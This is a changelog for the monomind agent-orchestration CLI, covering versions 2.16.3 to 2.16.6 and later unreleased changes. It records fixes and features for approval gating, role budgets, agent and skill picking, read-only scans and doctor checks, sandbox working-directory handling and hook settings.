- **An unattended `org run --task … -y` no longer idles silently when the boss calls `org_complete`.** ([Fixes #345](https://github.com/monoes/monomind/issues/345)) `org_complete` needs human approval by default (#170), and `-y` only skips the cost prompt, so the approval request went to `approvals.json` and the dashboard while the run's own log showed nothing until the process was killed. `org run` now prints each queued approval with the `monomind org approve`/`deny` command that resolves it. The new `org run --auto-approve org_complete[,tool…]` flag pre-approves the listed tools for every role, for that run only, and refuses a name no role gates. `-y` alone still leaves `org_complete` gated: the default gate is unchanged, so a detached run that relies on a human approving `org_complete` still waits for one, and tools a role's policy gates (`approvalTools`, the built-in `Bash`/`WebFetch`/`WebSearch`) still block unless they are listed.
- **A role whose budget ran out no longer looks like a crashed or stalled dispatch.** ([Fixes #343](https://github.com/monoes/monomind/issues/343)) Its open tasks, and any dispatched to it afterward, are held as `blocked` with a `budget_usd`/`budget_tokens` exhausted reason instead of sitting `ready` forever behind a "crashed or unreachable" bus warning; the coordinator gets one notice per role. `budget_usd` and `budget_tokens` are now hot-reloadable: raising a cap on `org reload` reopens a role that is no longer over it and re-dispatches its held tasks, without losing in-flight spend. See [Budget-closed assignees](doc/concepts/org-runtime.md#budget-closed-assignees).
- **`pick` ranks by the task's head, not its modifiers.** A purpose phrase or relative clause ("documentation *for* the REST API", "an org *that* monitors competitors") no longer outweighs what the task actually asks for — modifier words are downweighted, "new" is dropped as a stopword, boilerplate description openings shared across many skills are no longer indexed, and an id word that joins two other id words (e.g. `createorg`) now matches both. Frozen-eval top-3 accuracy rose for both agents and skills.
- **Platform adapters keep user edits inside `instructions:<platform>` blocks.** Reinstalling used to overwrite the `instructions:<platform>` block in `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` and similar files wholesale, discarding anything a user had edited inside it. These blocks now go through the same hash-guarded merge as `init`'s other managed regions: an edited block is kept with a warning, and only replaced (with a backup under `.monomind/backups/<run>/`) when `--force` is passed.
- **`init` no longer warns about this repo's own `.opencode` → `.claude` symlinks.** These are deliberate mirrors, and every `init` printed a `[WARN] .opencode/<x> resolves inside .claude/ (likely a symlink)` line for each of them; a symlinked destination that resolves exactly to the file it would have mirrored is now skipped silently instead of flagged.
- **`agent scan` no longer runs the agent CLIs it finds, so it does not download or write their state.** ([Fixes #337](https://github.com/monoes/monomind/issues/337)) It ran every installed runtime's `--version`, and in an empty HOME grok downloaded its 159MB native binary into `~/.grok`, hermes wrote `~/.hermes/logs` and `.update_check`, and codex, opencode and copilot created their own directories. Scan now reads the version from the npm `package.json` that owns the binary or from a mise/asdf `installs/<tool>/<version>` directory, and runs `--version` only for `claude`, `antigravity` and `pi`, whose `--version` writes nothing. For any other runtime it reports `version: null`. `agent scan --probe` runs `--version` for all of them, in a scratch HOME, cwd and TMPDIR that is deleted afterwards (grok still downloads into it). Each entry gains `version_source` (`package.json`, `install-path`, `exec` or `not-probed`), and the capability `agent-scan-read-only` advertises the change. The MCP `org_list_runtime_options` tool gets the same read-only scan. Contract: `doc/agent-exec-protocol.md` §6.

## [2.16.6] — 2026-09-26

### Fixed

- **`init` no longer inserts `skills:*` ownership marker comments into shipped skill files.** Ownership is now tracked via a content-hash init-manifest (`.monomind/init-manifest.json`, 4c26063ac): unedited shipped files are refreshed silently on the next `init`/`init --force`, files you hand-edited are left alone with the incoming version written alongside as `<file>.monomind-new`, and identical files are untouched. Old marker-style ownership (both the 2.16.5 HTML-comment style and pre-2.16.5 hash-style) is migrated away automatically the next time you run plain `init`/`init --force` (not `init upgrade`, which only touches helpers/statusline/CLAUDE.md/CAPABILITIES.md, f6cbeaa63). `cleanup`, `uninstall` and `platforms doctor` now use manifest-based ownership too (434ef8240). Fixes #344.

## [2.16.5] — 2026-09-25

### Fixed

- **`init` no longer destroys user content.** `.mcp.json`, `.monomind/config.yaml` and `opencode.json` are merged instead of overwritten (860a48d1c, 1ed11c258, ce68c8879, 6b89484f9); managed blocks in `.monomind/.gitignore` and `GEMINI.md` are tracked with HTML-comment ownership markers so user-written content around them survives `--force` (1a15198cd, ce68c8879, 4ee8db935); shipped files are hash-guarded, and a locally-edited file is never overwritten in place — it gets a `.monomind-new` copy alongside it instead (4b34f8645); anything `init` does overwrite is backed up first; `--force` says so when it refreshes a block that predates block hashes (4ee8db935); the deny-by-default `.gitignore` no longer gets never-commit lines appended to it (6cc057fa5); project memory is seeded in-process and only when memory is on (9477ed4b5); `doctor` writes specific `.monomind` excludes and warns when a running MCP server predates the installed CLI (185d1e1df, f8e3f5ac4).
- **Agent/skill picking is more conservative and more correct.** `monomind pick` (CLI and MCP) and the `[PICK]` hook line now apply the same confidence gate consistently (4d809461c, 9f3290f5e); the CLI's fallback text is shown in org-skill `[PICK]` lines (9f3290f5e); the prompt hook refreshes a stale skill index and drops removed skills instead of picking them (c1f27fb1b); namespaced slash commands are treated as commands, not prompts to pick for (312c2eb33); Jev's "no fit" verdict is never overridden by a keyword pick — a clear "none" stays "none" (2d98766e8); the Jev hook window is capped at 3s regardless of what the environment asks for (65bdeafb1); Jev now gets a category-diverse candidate set when keywords barely match, instead of a keyword-skewed one (d2a6e21a4); a description's own "not for X" clause is honoured when ranking candidates (f31e79951); `doctor`'s MCP-running check and `pick-stats`' adherence counting were both fixed (f8e3f5ac4, b25b5ab97).
- **Skill trees and packaging stay consistent with what ships.** The CLI package always ships the monodesign skill (193930c87), which is recompiled only when its sources actually change (0a5f26536, c4b1c76eb); a derived-kimi-tree check catches drift (8e37b0640); dead CLI references in skills — commands the built CLI doesn't have — are replaced with real ones, and `lint-skills` now fails the build if any remain (db2495d28, 6ff62eb55); `SKILLS_MAP` matches the shipped skill tree (66b21d20c); command and skill descriptions were fixed where missing, invalid YAML, or stale (580a5c7a9, 61b0dd7e9, 1f988a04e).

### Internal

- Fixed a flaky assertion in `init-generated-timestamp-stability.test.ts` that asserted on a timestamp-stamp collision (402828396); test-only, no behavior change.

## [2.16.4] — 2026-09-25

### Added

- **User-level agents are indexed and routed.** Agents in `~/.claude/agents/**` join the agent registry with origin `user`, so the prompt hook, `monomind pick` and the `pick` MCP tool can choose them in every project; a project agent with the same slug or name wins and the hidden one is listed as shadowed. The registry builder is now one CommonJS helper (`.claude/helpers/agent-registry.cjs`) shared by the CLI and the hooks, and every session start rebuilds a stale registry, so a new user agent is routed from the next session without running the CLI. `monomind init` and `init upgrade` build both routing indexes and print their counts, for example `Indexed 89 agents (1 from ~/.claude/agents) and 569 skills (1 from ~/.claude/skills)`. `pick --json` agent entries carry `origin`, and `doctor` shows user and shadowed counts.
- **`org_skill_show` MCP tool.** Input `{ name }`; returns one Org-library skill's description, tags, tools, origin and body, read locally (catalog skills only while active for `org`). Picked Org skills now point at it, so they work without a global `monomind` install.
- **Agents & Skills guide.** `doc/concepts/agents-and-skills.md` and a matching page on the docs site explain where agents, skills, slash commands and Org skills live, their frontmatter, how to add and verify each, and how picking works (with [Routing](doc/concepts/routing.md) as the mechanism deep-dive). The docs now carry auto-counted agent, skill, command and Org-skill totals checked by `docs:counts:check`.
- **`pick-eval --logs` measures picking on real use.** `node scripts/pick-eval.mjs --logs [dir]` reads a project's hook logs and scores the current ranker (keyword, or `--jev`) against the agents actually spawned, with route statistics and the top disagreements (redacted previews only); `--export FILE` writes the labelled prompts as a `tests/pick-eval` dataset to review and curate. `doctor -c pick` adds a line `real use: N spawns, followed X%, current ranker agrees Y% (top-3)` once 10 spawns are recorded.
- **`browse --session <name>` now selects an isolated named session.** ([Fixes #318](https://github.com/monoes/monomind/issues/318)) The documented flag did nothing outside `open`, where it only restored saved state; every later `--session` command then silently acted on the newest session, so two "named" browsers were really one and one, or a `snapshot`/`scroll` call using `-s` for `--selector` on a named session, could return the wrong tab. Session records now carry a name: `open`/`connect --session X` start the session named `X` or re-open the live one, any other command with `--session X` acts on it and fails with `No live browse session named "X"` when there is none, and `--session` has no `-s` shorthand on `snapshot`/`scroll` (which use `-s` for `--selector`). A command with no `--session` still resolves the sole live session in the directory — named or not — and only refuses to guess when two or more are live. `@monoes/monobrowse` 1.0.23.

### Changed

- **Picks ignore what a prompt rules out.** The keyword ranker drops words in the scope of "rather than", "other than", "instead of", "except", "besides", "without", "not", "no" and similar cues, up to the next clause boundary, so "anything else pending rather than release" no longer picks `release-manager`; problem descriptions such as "is not loading" keep their words. Status questions like "anything else pending?" now count as trivial and get no `[PICK]`.

### Fixed

- **`init --target antigravity` gives Antigravity a working status bar.** That target turns the helper component off, so no `statusline.cjs` was written anywhere and the status bar (`.gemini/helpers/statusline.sh`) printed nothing. Init now copies the helper tree into `.gemini/helpers` when Antigravity is selected without the helper component. It still installs no `.claude/helpers` or hooks.
- **`init` writes `.gemini/helpers` only when Antigravity is selected.** Only Antigravity's status bar reads that copy of the helper tree, but `init` wrote it for every Claude or Codex-with-hooks setup, e.g. `--platform claude` or `--target codex`. Kimi's statusline reads `.claude/helpers` first, so it does not need it. An existing `.gemini/helpers` is not deleted, and `init upgrade` still refreshes it where it exists.
- **The `org` command reference covers every subcommand and flag.** `org events` and `org approvals` were undocumented, along with flags such as `run --resume`/`--budget-usd`, `create --goal`/`--schedule`, `questions --all` and the `--by` resolver flags; `serve --forward` (which does not exist), the `approve`/`deny` arguments and the `supervisor`/`test-loop` arguments were wrong.
- **The metrics-db hook tests run again.** They skipped themselves unless `sql.js` resolved from the repo root, a dependency the helper dropped long ago, and one test always failed; they now check the helper runs with no packages installed, and its nine real tests run.
- **`monomind init --with-embeddings` actually prepares embeddings.** It shelled out to `npx monomind@latest embeddings init`, a command that does not exist, so it always printed "Embedding initialization skipped." It now runs in-process — the `embeddings_init` MCP tool writes `.monomind/embeddings.json` and downloads `gte-modernbert-base` with the same revision/dtype the memory bridge loads — and offline (or with `MONOMIND_NO_LOCAL_EMBEDDINGS=1`) it continues with a warning pointing at `monomind doc eval --provision-model`.
- **`init` and `doc ingest --embedder` default to and describe the embedding model memory search actually uses.** Init presets, `init --embedding-model`, the init wizard and `hooks pretrain` defaulted to `Xenova/all-MiniLM-L6-v2` (384d) while the memory bridge always embeds with `Alibaba-NLP/gte-modernbert-base` (768d); the default is now `gte-modernbert-base` everywhere (MiniLM and MPNet stay accepted choices, and existing `.monomind/embeddings.json` files are untouched). `doc ingest --embedder` help said it picked `minilm` (384d) or `bge-m3` (1024d); the flag never worked that way — ingest always shares the 768d memory-bridge store — so it is now documented as deprecated and a no-op, and a non-`minilm` value warns that it is ignored.
- **A sandboxed Claude role's Bash shell stays pinned to its cwd.** ([Fixes #339](https://github.com/monoes/monomind/issues/339)) Claude Code's sandbox makes an existing `hooks` or `config` entry read-only from the session cwd down to the shell's current directory, and the shell's directory persists between Bash calls — so a role that `cd`'d into a package directory could get a sibling package bind-mounted read-only and fail its tests with `EROFS`. A sandboxed role now runs with `CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR=1`, so its shell returns to the cwd after every command.
- **`monograph watch` no longer silently drops a rebuild.** ([Fixes #338](https://github.com/monoes/monomind/issues/338)) When the cross-process build lock was held by another monograph command, a queued watch rebuild was skipped and the change batch was dropped for good, while the watcher and the MCP `monograph_watch` tool still printed a success message. A shared rebuild queue now serializes watch rebuilds, folds changes that arrive mid-build into the next one, and retries a lock-skipped batch until it builds; each rebuild logs its real outcome, for example `Graph updated in 9.7s — nodes +2 (now 20653), …` or `Rebuild deferred — another build is in progress; retrying …`. `@monoes/monograph` 1.6.10.
- **`mastermind-agents hire` writes role entries `org run` accepts as current-format.** It appended new roles with the retired `agent_type` key, so runorg's legacy check treated an otherwise current-format org as needing migration. `hire` now writes `type` (default `specialist`), requires `reports_to` to name an existing role, and runs `monomind org validate` afterward; `list` shows `type`, `inspect` lists direct reports instead of reading the retired `communication` array, and `remove` no longer writes a `communication` key.

## [2.16.3] — 2026-09-25

### Added

- **`monomind doctor --json`, advertised as capability `doctor-json`.** stdout holds one JSON document with every check's result, the `component` id that re-runs it (`-c`), and how its fix is applied: `auto` (local and repeatable, by `--fix`), `confirm` (installs software or runs network or `sudo` commands, so the caller asks a person first, then passes the flag the result names) or `manual`. With `--fix` it also lists what was fixed. Everything a check or fix prints, and the subprocesses a fix runs, go to stderr. An unknown `-c` name comes back as the payload's `error`. mono-agent uses this to show and fix monomind's checks in its Settings › System health, per project. Contract: `doc/agent-exec-protocol.md` §10.
- **`monomind doctor --read-only` and `--offline`, advertised as capabilities `doctor-read-only` and `doctor-offline`.** ([Fixes #335](https://github.com/monoes/monomind/issues/335)) A read-only run changes no file in the project or `$HOME`; it is the default under `--json` unless `--fix` or `--install` is given, and `--read-only` asks for it in the human output. `--offline` skips every check that uses the network. A check that cannot run in the mode is reported with status `skipped` and a `skipped_reason` (`read-only` or `offline`); the JSON payload also gains `read_only`, `offline` and `summary.skipped`. `--read-only --fix` and `--offline --install` are refused. mono-agent can now include monomind's checks in its read-only `monoagentcli doctor` default. Contract: `doc/agent-exec-protocol.md` §10.1.
- **`agent scan --json` entries carry `install` and `login_hint`.** `install` is the install hint in a shape a caller can run without a shell — `npm` packages, an https install `script` for bash/sh, or `manual` for anything else — and `login_hint` is the runtime's sign-in command, as text to show a person — never something to run. An install script URL must be a plain https URL; a hint with shell syntax, credentials in the URL or an npm version range is `manual`. mono-agent's `agent install` and its Agents page use them.
- **Claude sees the prompt's pick as one `[PICK]` line.** The `UserPromptSubmit` hook now prints `[PICK] agent: <name> · skill: <invoke>` into Claude's context when it is confident: a Jev decision-model answer at or above `MONOMIND_JEV_MIN_CONFIDENCE` (0.6), or a keyword agent with a relevance score of at least 2 and a 1.5× lead over the runner-up (a keyword skill needs a score of 4). `<name>` is the agent's frontmatter `name`, the value the Task tool takes as `subagent_type`. Ties and weak overlap print nothing. The line is printed even under `MONOMIND_HOOK_QUIET`, which `monomind init` sets; the other banners stay quiet. Task notifications, reminder-only turns, slash-command expansions and local-command output get no pick. The generated `CLAUDE.md` tells Claude to follow a `[PICK]` line unless it is clearly wrong and to call the `pick` tool before choosing a subagent itself.
- **`pick` MCP tool (`mcp__monomind__pick`).** Input `{ task, kind?: "agents" | "skills" | "both", categories?, top?: 1-20 }`; it returns the same JSON as `monomind pick --json` plus a one-line `summary`. It is in the core tool set, so the advertised MCP tool list grows by one.
- **The hooks log whether a pick was followed, and a bounded prior learns from it.** A new `PreToolUse` hook on `Task|Agent` spawns writes `.monomind/pick-adherence.jsonl` (the session's pick, the `subagent_type` actually spawned, `followed`); it only observes. `.claude/helpers/pick-stats.cjs` folds adherence and SubagentStop outcomes into `.monomind/pick-stats.json` at SubagentStop and SessionEnd. An agent with at least 5 observations gets a factor between 0.85 and 1.15 from its success and adoption rates, applied to keyword agent scores in `monomind pick` and the prompt hook. The largest swing (about 1.35×) is below the 1.5× lead a `[PICK]` needs, so history breaks near-ties but never overturns a clear match; Jev rankings are not re-ranked. `monomind pick --explain` shows `score = baseScore × prior` and the pick history, and `readPickStats(root)` is exported. In org runs, auto-assignment and per-task skill suggestions break keyword near-ties the same way from the run's own finished tasks (3 outcomes minimum).
- **`monomind pick --min-confidence`, `--explain`, and low-confidence rankings.** A Jev answer below 0.6 is no longer thrown away when a person or Claude reads the result: down to `MONOMIND_JEV_PICK_MIN_CONFIDENCE` (default 0.25, or `--min-confidence`) it is kept and flagged `lowConfidence: true`. Jev tail entries under 0.02 are dropped. Each list in the JSON now carries `source` (`jev`, `keyword`, or `keyword-fallback` when a configured model gave no usable answer). Agents print by their spawnable name.
- **`pnpm run pick:eval` and `monomind doctor -c pick`.** The eval scores 60 tasks in `tests/pick-eval/` (each listing every acceptable agent and skill) with the keyword ranker in-process, or through the real picker with `--jev`; CI holds a floor on a frozen catalog snapshot. Keyword picks now get agents right at top-1 on 47/60 tasks and skills on 49/59; Jev gets 59/60 and 58/59. Before this work, on the original 40 tasks, keyword got 23/40 and 27/40 and Jev 34/40 and 39/40. `doctor -c pick` (opt-in, not in the default run) reports registry and skill-index counts and freshness, whether a decision model is configured, the eval score when the project carries the set, `[PICK]` adherence, and subagent success when the pick was followed versus overridden.
- **`pnpm run lint:agent-refs`, in `verify` and CI.** Every `subagent_type`, `agentSlug` and `Skill(...)` name in shipped skills, commands, the init generators and the `CLAUDE.md` agent rosters must name an agent or skill that exists.
- **Skills can declare `pick: low`.** The skill index records it and the keyword ranker keeps 35 % of such a skill's score, so admin and meta skills (the org management pages, `specialagent` and a few others, which now declare it) surface only when a task names them.
- **Org task provenance and `org_skill_search`.** Every task created by `org_task` records `assignedBy` (`auto` or `explicit`); an auto-assigned task also records `pick` (method, confidence or score, top three candidates), and suggestions and loads are recorded as `suggestedSkills` and `loadedSkills`. Audit events `task-auto-assigned`, `task-skills-suggested` and `skill-loaded` carry the same data. Roles with `skills` or `skill_pool` get `org_skill_search`, which ranks the whole library by name and description; loading stays limited to the role's own skills.
- **Agent frontmatter for picking.** Every bundled agent now has `when_to_use`, `tags` and one `category` (core, architecture, engineering, testing, security, devops, github, marketing, design, coordination, data-ai, specialized), and every description fits in 160 characters. The registry stores `whenToUse`, `tags` and `vibe`, and the picker leads each agent's text with `when_to_use`. Org skills get the same treatment: all 376 descriptions open with a sentence of at most 160 characters ("Use when…", or "Org role guidance…" for the 36 that share a name with an agent), with 3-5 tags each from the new 99-tag vocabulary in `org-skills/TAGS.md`.
- **`summary` in `monomind pick --json`**, the same one-line `agent: <name> · skill: <invoke>` the MCP tool returns.

### Changed

- **One index for agents and skills, shared by every selector.** The prompt hook and `monomind pick` now load candidates through one loader (`.claude/helpers/jev-catalog.cjs`) and rank exactly the same set: the registry's agents (deprecated ones left out), then platform skills (the project's `.claude/skills` and commands, plus `~/.claude/skills` for names the project lacks, `origin: "user"`), then Org-library skills (bundled, `~/.monomind/org-skills`, project and active catalog entries) whose name is not already a platform skill, a known alias of one, or an agent. Each ranked skill is tagged `source: "platform"` or `"org"`; an Org skill's `invoke` is `mcp__monomind__org_skill_show {"name":"<name>"}`. README, overview and helper-only skill files are no longer entries. The agent registry is built for the project root, awaited when missing or stale, written atomically and never replaced by an empty one. `doctor -c registry` now reports duplicate slugs and extra agent roots.
- **`.claude/helpers/skill-registry.json` is generated per machine and no longer shipped.** `monomind init`, `init upgrade`, `monomind pick` and SessionStart build it when it is missing or older than its sources, and it is gitignored. A project that committed the file can delete it from version control.
- **The keyword ranker is BM25-style.** `.claude/helpers/pick-rank.cjs` drops stopwords, stems words lightly, weights each word by its rarity across the catalog, normalises description matches by length and scales by the share of task words matched. The old bonus for a category prefix in an id (`engineering-`, `mastermind-`) is gone. It is the fallback of every picker and builds the shortlist Jev chooses from.
- **Every agent selector wraps the central picker.** `hooks_route`, `monomind hooks route`, `hooks_pre-task`, `hooks_explain` and `route task` rank through the same code as `monomind pick`, so they can no longer disagree, and every agent they return is a spawnable name (`coder` when nothing ranks). `hooks_route` no longer takes `useSemanticRouter` and no longer blends memory-bridge or ReasoningBank matches; `semanticMatches` is always empty and `topK` (1-20) sets the count. `route task`'s fixed eight-type table (`architect`, `optimizer`, `debugger`, `documenter`, …) is gone and `route list-agents` lists the registry. `route semantic`, `hooks_route_semantic` and `agent spawn --task` ask the picker first: a decision-model answer at or above 0.6, then the `@monoes/routing` keyword rules, then a clearly leading keyword pick; embeddings and the Haiku fallback run only after that. `agent spawn --type` accepts any registry agent name, and the old fixed types map to one (`architect` → `Software Architect`, `security-auditor` → `Security Engineer`, …). **Breaking for `guidance_recommend` callers:** the recommended agents moved from each capability area's `agents` list to one top-level `agents` array (`{ name, confidence, reason }`) from the picker.
- **`@monoes/routing` 1.1.1 routes name agents that exist.** Every route and keyword rule names a bundled agent's spawnable name (`Security Engineer`, `DevOps Automator`, …) instead of slugs that did not ship. **Routes and rules with no matching agent are removed**, not redirected: the game-development routes and the Blender, Unreal, Unity and Godot rules, the Salesforce rule and route, the TikTok and LinkedIn routes, and the ZK-proof rule.
- **Skills and commands pick their specialists instead of naming them.** The mastermind skills and commands ask the `[PICK]` line, then the `pick` MCP tool, then a local `monomind pick` (never through `npx`), and keep a short fallback of agents that exist. About 75 agent and skill names that did not exist are fixed (`backend-dev`, `code-review-swarm`, `Trend Researcher`, `Skill("mastermind-do")`, …). `/mastermind:<x>` references point at `/mastermind-<x>` where only a skill exists. The content, marketing, sales, ops and finance commands spawn a picked specialist instead of a missing `mastermind-<domain>` skill. `mastermind-agent-select`'s category map and fallbacks name real registry categories and agents.
- **Near-duplicate agents are deprecated.** `Code Reviewer` → `reviewer`, `mobile-dev` → `Mobile App Builder`, `monoswarm-pr` → `pr-manager`, `monoswarm-issue` → `issue-tracker`. They are no longer picked but can still be spawned by name. `security-manager` is scoped to consensus-protocol security, so application security goes to `Security Engineer`. The reengineer-squad tester is renamed `reengineer-tester` so it no longer collides with the core `tester`.
- **Org auto-assignment picks the specific role, or refuses.** `org_task`'s `assignee: "auto"` never picks an endpoint role or the caller, reads the task's brief, weights words by how few roles mention them, needs a minimum score, and breaks ties by specificity and then by open work instead of declaration order. A tie that survives, or no role clearing the bar, refuses the call and names the closest roles. Per-task skill suggestions now work without a decision model, by keyword match over the role's pool.
- **Route records say what was picked and shown.** `.monomind/route-outcomes.jsonl` stores a prompt hash and a secret-redacted 120-character preview instead of the first 500 characters of the prompt, plus the candidates, provider, session id and `shown` (whether a `[PICK]` line was printed). Each session's latest pick is kept in `.monomind/routes/<sessionId>.json`, so concurrent sessions no longer read each other's picks.

### Fixed

- **`agent scan` writes nothing.** It no longer runs the startup update check (which wrote `~/.monomind/update-state.json` after a network call) or the subsystem init (which wrote `.monomind/registry.json` in the current directory). Callers such as mono-agent run it on a timer to show installed runtimes. The agent CLIs' own `--version` probes may still write their own state.
- **`init upgrade` refreshes the `.gemini/helpers` copy too.** `init` writes the helper tree to `.gemini/helpers` as well as `.claude/helpers`, and Antigravity's status bar runs `.gemini/helpers/statusline.cjs` from it, but `init upgrade` only refreshed `.claude/helpers`, so upgraded projects kept the first install's helpers there. The Gemini copy now gets the same refresh (only where it exists; files the bundle does not ship are kept), and `doctor` reports stale files in it under Helper Files.
- **The "update available" notice goes to stderr.** It was written to stdout on the first run of any command after a release, ahead of the JSON of `agent scan --json`, `doctor --json` and the org `--json` commands, so callers such as mono-agent failed to parse it ("invalid character '↑'"). stdout now holds only the command's own output.
- **`doctor --json` no longer writes to the folder it checks or to `$HOME`.** ([Fixes #335](https://github.com/monoes/monomind/issues/335)) A plain `doctor --json` rewrote `.monomind/registry.json` (from the CLI's startup refresh and the Agent Registry check), created the memory database under `~/.monomind/projects/` to count the knowledge graph, wrote the update-check state, updated the monograph db's `-shm` file, and filled `~/.npm` with cache entries and debug logs. Read-only runs now do none of this (see Added). The TypeScript check no longer runs `npx tsc --version`, which downloaded the unrelated `tsc` package from the registry in a project without TypeScript; it reads the version of the project's own `typescript` package.
- **`monograph watch` no longer drops a change when the build lock is held.** ([Fixes #338](https://github.com/monoes/monomind/issues/338)) Each change batch started its own rebuild. When another build held the lock (a second `monograph` command, the background build `init` starts, the session-start refresh), the rebuild was skipped, the batch was dropped, and the watcher still printed `Rebuild complete.`, so the change never reached the graph. Rebuilds now run one at a time; changes that arrive during a build go into the next one, and a batch that finds the lock held is retried every 2 s until it builds. Each rebuild logs what it did, for example `Graph updated in 13.2s — nodes +2 (now 19841), edges +2 (now 34410)`, or `Rebuild deferred — another build is in progress; retrying …`. A rebuild is one transaction, so on a large project the change appears only when that line is printed; stopping the watcher earlier discards it. The `monograph_watch` MCP tool and `watchAsync` use the same queue. `@monoes/monograph` 1.6.10: `buildAsync` returns what it did (`{ status: 'built', nodes, edges }` with before and after counts, or `{ status: 'skipped', reason: 'locked' | 'fresh' }`), and `createRebuildQueue` and `describeRebuildEvent` are exported.
- **`-v` debug lines go to stderr.** `[DEBUG]` and `[TRACE]` lines, and the "Completed in …ms" line, were written to stdout, so `-v` with a `--json` command put them ahead of the JSON. They now go to stderr, like `[INFO]`.
- **The agent registry reads agent frontmatter correctly and no longer holds duplicates.** `.monomind/registry.json` left every agent's `capabilities` empty, because the builder skipped the `expertise:` list inside a `capability:` block, and stored a literal `|` as the description of the 17 agents that write it as a YAML block scalar. It now reads both, so `monomind pick` and Jev see each agent's expertise and description. The repo's own `.claude/agents/` also held 88 flat copies of agents that live in category folders (committed by accident in 2026-09), which put 63 agents in category `default` and gave 49 agents two registry entries; they are removed. The shipped package tree was not affected.
- **`org_task_cancel` stops the assignee's work on the task.** On the 2.16.2 release run the coordinator cancelled task-25 while the fixer was mid-turn on it. Nothing told the fixer, which worked on for 25 minutes and committed a fix that was later integrated after the final audit. The assignee is now sent `[task:<id>] CANCELLED … — stop now, do not commit or report further work for it`. In task scope (`session_scope: 'task'`), a running process for that task is also ended, the way a sandbox fault ends one, since mail only arrives when a turn ends. Processes for the role's other tasks are left alone. `org_task_done` on a cancelled task is refused with the cancel reason and the instruction to stop, where it used to say the close "would notify its creator about work that was reported long ago". `org_task_cancel`'s description says this, so the org tool list changes once.
- **A role's Bash sandbox no longer fails on an SDK stub that has gone away.** On the 2.16.2 release run docs-writer's Bash calls failed with `bwrap: Can't find source path ~/.claude/local`. When a read-only directory holds the role's cwd or `~/.claude`, monomind passes the SDK that directory's existing entries (#323). Those entries included the empty mount-point stubs another sandbox had made, and the SDK deletes a stub when the sandbox that made it ends. A stub that was listed when the role's process started but gone by a later Bash call made bwrap fail. Empty regular files are now left out of that list. The SDK already denies those names itself.
- **A command that runs bwrap itself no longer counts as the role's sandbox failing.** Any Bash result starting `bwrap: ` was taken as the OS sandbox failing to start, and two in a row restart the role's process. On the 2.16.2 release run cli-qa's orphan-reaper repros ran bwrap on purpose and printed `bwrap: : No such file or directory` among other output, which was counted. A result now counts only when it is wholly one of the messages bwrap dies with while it sets the sandbox up (`Can't …`, `Creating …`, `setting up …`, `execvp …`, …). The tool's leading `Exit code N` line is allowed, so a failed call such as `Exit code 1` + `bwrap: Can't find source path …`, which was missed before, is counted now.
- **A sandboxed Claude role's `cd` no longer makes a sibling directory read-only.** ([Fixes #339](https://github.com/monoes/monomind/issues/339)) On the 2.16.3 release run `packages/@monomind/hooks` in the release worktree was read-only for the builder, and only in that task, so its tests could not start (EROFS on vitest's temp file). Claude Code's sandbox makes an existing `hooks` or `config` entry read-only in every directory from the role's cwd down to the directory its Bash shell is in, and rebuilds that list whenever a settings file changes. The shell had been left in `packages/@monomind/memory`, so the sibling `hooks` package was caught, and whether it happened depended on when a settings change arrived. A sandboxed Claude role now runs with `CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR=1`, so its shell returns to the role's cwd after every command, and its prompt says that a `cd` lasts for one command only. The sandbox's write rules are unchanged.
- **Hook timeouts are written in seconds.** Claude Code reads a hook's `timeout` in seconds, and the generated settings wrote milliseconds: `5000` allowed a hung hook about 83 minutes. They now write seconds (12 for the prompt hook, which covers the longest Jev window).
- **Route outcomes record the agent that actually ran.** The prompt hook no longer fills `agentActuallyUsed` with its own recommendation; only a real Task/Agent spawn sets it. SubagentStop logs the subagent from the event's `agent_type` as `actualAgent` and the pick as `suggestedAgent`, which were swapped, and PostTask reads `agent_type` too. Session-end success reads the tail of a large outcomes file instead of skipping it.
- **SessionStart rebuilds a stale skill index.** A missing `skill-registry.json`, or one older than `.claude/skills`, is rebuilt at session start instead of serving skills that no longer exist.
- **`router.cjs` no longer selects agents or skills.** Most slugs in its keyword agent table were not registry agents; the table is gone, and the prompt hook ranks keyword agents and skills with `pick-rank.cjs` over the shared catalogs (a keyword skill needs a score of at least 3 and a 1.25× lead).
- **Recommendations name agents that exist.** `guidance_recommend`'s capability areas and workflows, `route coverage`/`coverage_route` gap assignments and the prompt hook's intelligence advisory named agents that do not ship (`security-architect`, `backend-dev`, `code-review-swarm`, `swarm-pr`, …); they now name registry agents.
- **`mastermind-new-agent` writes valid Org Runtime v2 roles, and `mastermind-createorg` seeds role responsibilities from the agent registry.**
- **The generated settings no longer mention `MONOMIND_HOOK_VERBOSE`.** The `MONOMIND_HOOK_QUIET` comment offered it as the opt-out, but nothing reads it; the opt-out is removing `MONOMIND_HOOK_QUIET` or setting it to `0`.
- **Catalog skills reach the decision model only with approval.** A skill projected from the catalog, including a copy in `~/.claude/skills`, is sent to Jev only when `.monomind/catalog/state.json` exists, lists it active with the `jev` target, and its package digest verifies. Before, a missing state file let the projection's own `jev:yes` marker through, and user skills were never checked. `doc/privacy.md` now lists what the picker sends.
- **The picker writes nothing outside a project.** `monomind pick`, `route`, `agent` and `doctor` run from `$HOME` or a folder that is not a project build their catalogs in memory; they no longer create `.monomind/registry.json` or a skill index there. The skill index is never replaced by an empty one.
- **Concurrent sessions no longer lose route records.** Appends, outcome joins and rotation of `.monomind/route-outcomes.jsonl`, from the hook and from `hooks_route`, hold one lock file; in a two-process test 28 of 150 records were lost before and none after.
- **Slash commands no longer count as recommendations.** A slash-command route names no agent, and a spawn is compared only with its own session's route, so adherence and the outcome prior are not skewed.
- **The outcome prior stays bounded.** Counts read from `pick-stats.json` are sanitised and the factor is clamped to ×0.85–1.15, so a damaged file cannot reorder picks or produce NaN scores.
- **Every selector ranks with the outcome prior.** The `pick` MCP tool, `hooks_route`, `route task` and `guidance_recommend` now apply it like `monomind pick` and the hook, so they return the same order.
- **No pick for trivial prompts, and non-Latin prompts rank.** Prompts with fewer than three content words get no `[PICK]`; the keyword tokenizer handles Unicode letters, folds accents and splits CJK text into bigrams.
- **SubagentStart/SubagentStop are silent under `MONOMIND_HOOK_QUIET`**, and two same-type subagents finishing in the same millisecond both count.
- **`init upgrade --settings` brings old installs up to date.** It adds the monomind hooks the install lacks (the `Task|Agent` adherence hook, SubagentStart/Stop capture) and converts monomind hook timeouts written in milliseconds to seconds; user hooks are untouched. Upgrade also refreshes bundled agents whose body the user has not edited. New doctor check `hook-settings` warns about missing pick hooks and millisecond timeouts, and the registry check counts agents missing `when_to_use`.
